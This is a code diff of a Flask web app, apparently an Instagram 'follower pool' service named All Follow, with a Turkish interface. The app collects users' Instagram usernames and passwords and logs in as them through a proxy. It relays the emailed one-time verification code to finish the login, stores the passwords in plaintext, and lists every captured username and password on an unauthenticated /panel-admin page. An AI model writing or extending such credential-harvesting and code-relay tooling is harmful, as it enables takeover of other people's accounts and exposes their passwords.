@@ -2,7 +2,6 @@ import os
 from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
-from instagrapi.exceptions import ChallengeRequired, BadPassword, EmailRequired
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_v4.db"
@@ -17,8 +16,8 @@ class PoolUser(db.Model):
     password = db.Column(db.String(100), nullable=False)
     status = db.Column(db.String(255), default="Beklemede")
 
-# Geçici olarak client nesnelerini hafızada tutmak için (Kod onayı için gerekli)
-clients = {}
+# Client nesnelerini ve şifreleri hafızada tutuyoruz (OTP onayı için)
+temp_data = {}
 
 @app.route('/')
 def home():
@@ -27,7 +26,7 @@ def home():
     <html lang="tr">
     <head>
         <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>All Follow | Challenge Fix</title>
+        <title>All Follow | V4.1 Stable</title>
         <script src="https://cdn.tailwindcss.com"></script>
     </head>
     <body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200 font-sans">
@@ -46,42 +45,43 @@ def home():
                 <button onclick="verifyOtp()" class="w-full bg-yellow-600 py-4 rounded-xl font-bold hover:bg-yellow-500 transition-all">KODU ONAYLA</button>
             </div>
             
-            <p id="msg" class="text-xs mt-6 font-semibold text-slate-500 uppercase"></p>
+            <p id="msg" class="text-xs mt-6 font-semibold text-slate-400 uppercase leading-relaxed"></p>
         </div>
 
         <script>
             let currentUsername = "";
             async function login() {
                 const u=document.getElementById('u').value, p=document.getElementById('p').value;
-                currentUsername = u;
+                currentUsername = u.trim().toLowerCase();
                 const btn=document.getElementById('btn'), msg=document.getElementById('msg');
-                btn.disabled = true; msg.innerText = "Bağlanılıyor...";
+                btn.disabled = true; msg.innerText = "Instagram ile tünel kuruluyor...";
                 
-                const r = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
-                const d = await r.json();
-                
-                if(d.status === "challenge") {
-                    document.getElementById('login-form').classList.add('hidden');
-                    document.getElementById('otp-form').classList.remove('hidden');
-                    msg.innerText = "E-postanıza bir kod gönderildi!";
-                } else {
-                    msg.innerText = d.msg;
-                    btn.disabled = false;
-                }
+                try {
+                    const r = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:currentUsername, p:p})});
+                    const d = await r.json();
+                    
+                    if(d.status === "challenge") {
+                        document.getElementById('login-form').classList.add('hidden');
+                        document.getElementById('otp-form').classList.remove('hidden');
+                        msg.innerText = "Instagram e-posta kodu istedi. Lütfen kodu girin.";
+                    } else {
+                        msg.innerText = d.msg;
+                        if(d.status !== "success") btn.disabled = false;
+                    }
+                } catch(e) { msg.innerText = "Bağlantı hatası."; btn.disabled = false; }
             }
 
             async function verifyOtp() {
                 const code = document.getElementById('otp').value;
                 const msg = document.getElementById('msg');
-                msg.innerText = "Kod onaylanıyor...";
+                msg.innerText = "Kod doğrulanıyor...";
                 
-                const r = await fetch('/api/verify-otp', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:currentUsername, code:code})});
-                const d = await r.json();
-                
-                msg.innerText = d.msg;
-                if(d.status === "success") {
-                    setTimeout(() => location.reload(), 2000);
-                }
+                try {
+                    const r = await fetch('/api/verify-otp', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:currentUsername, code:code})});
+                    const d = await r.json();
+                    msg.innerText = d.msg;
+                    if(d.status === "success") setTimeout(() => location.reload(), 2000);
+                } catch(e) { msg.innerText = "Onay başarısız."; }
             }
         </script>
     </body>
@@ -91,12 +91,11 @@ def home():
 @app.route('/api/login', methods=['POST'])
 def login():
     data = request.json
-    u, p = data.get('u').strip().lower(), data.get('p').strip()
+    u, p = data.get('u'), data.get('p')
     
     cl = Client()
     cl.set_proxy(PROXY_URL)
-    clients[u] = cl # Client'ı hafızaya alıyoruz
-
+    
     try:
         cl.login(u, p)
         # Başarılı ise veritabanına ekle
@@ -106,36 +105,49 @@ def login():
         db.session.commit()
         return jsonify(status="success", msg="Giriş başarılı!")
 
-    except ChallengeRequired:
-        # Instagram kod istiyor!
-        cl.challenge_code_handler = None # Otomatik handler'ı kapat
-        return jsonify(status="challenge", msg="Kod gerekli")
-    
     except Exception as e:
-        return jsonify(status="error", msg=str(e)[:50])
+        err = str(e).lower()
+        # Challenge (Kod isteği) kontrolü
+        if "challenge" in err or "checkpoint" in err:
+            temp_data[u] = {"client": cl, "password": p}
+            return jsonify(status="challenge", msg="Kod gerekli")
+        
+        # Hatalı şifre kontrolü
+        if "password" in err:
+            return jsonify(status="error", msg="Şifre yanlış.")
+            
+        return jsonify(status="error", msg=f"Hata: {err[:40]}")
 
 @app.route('/api/verify-otp', methods=['POST'])
 def verify_otp():
     data = request.json
     u, code = data.get('u'), data.get('code')
-    cl = clients.get(u)
+    
+    stored = temp_data.get(u)
+    if not stored: return jsonify(status="error", msg="Oturum bulunamadı, baştan deneyin.")
 
-    if not cl: return jsonify(status="error", msg="Oturum zaman aşımı")
+    cl = stored["client"]
+    p = stored["password"]
 
     try:
-        # Kodu Instagram'a gönder
-        cl.login(u, cl.password, verification_code=code)
+        # Kodu göndererek girişi tamamla
+        cl.login(u, p, verification_code=code)
+        
         user = PoolUser.query.filter_by(username=u).first()
+        if not user: user = PoolUser(username=u, password=p); db.session.add(user)
         user.status = "AKTİF ✅"
         db.session.commit()
-        return jsonify(status="success", msg="Hesap başarıyla havuza eklendi!")
+        
+        # Hafızayı temizle
+        del temp_data[u]
+        return jsonify(status="success", msg="Hesap doğrulandı ve havuza eklendi!")
     except Exception as e:
-        return jsonify(status="error", msg="Kod hatalı veya süresi dolmuş.")
+        return jsonify(status="error", msg="Kod hatalı veya Instagram kabul etmedi.")
 
 @app.route('/panel-admin')
 def admin():
     users = PoolUser.query.order_by(PoolUser.id.desc()).all()
-    res = f"<body style='background:#0a0f1e;color:#fff;padding:20px;font-family:sans-serif;'><h2>All Follow Havuzu ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
+    res = f"<body style='background:#0a0f1e;color:#fff;padding:20px;font-family:sans-serif;'><h2>All Follow Admin ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
     for u in users:
         res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
     return res + "</table></body>"
